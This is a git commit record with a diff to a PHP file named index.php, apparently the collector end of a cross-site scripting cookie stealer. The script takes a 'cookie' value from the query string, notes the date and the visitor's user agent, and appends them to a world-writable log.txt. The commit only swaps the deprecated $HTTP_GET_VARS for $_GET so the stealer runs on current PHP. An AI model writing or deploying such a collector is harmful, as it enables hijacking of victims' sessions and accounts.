4a11f671e8b25a0b1c89c96de02bd85f0e597126
TestName{UFO} <36362763+testufo@users.noreply.github.com>
2020-10-19 16:29:44 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
-$collectedCookie=$HTTP_GET_VARS["cookie"];
+$collectedCookie=$_GET["cookie"];
 $date=date("l ds of F Y h:i:s A");
 $user_agent=$_SERVER['HTTP_USER_AGENT'];
 $file=fopen('log.txt','a'); // chmod 777 log.txt
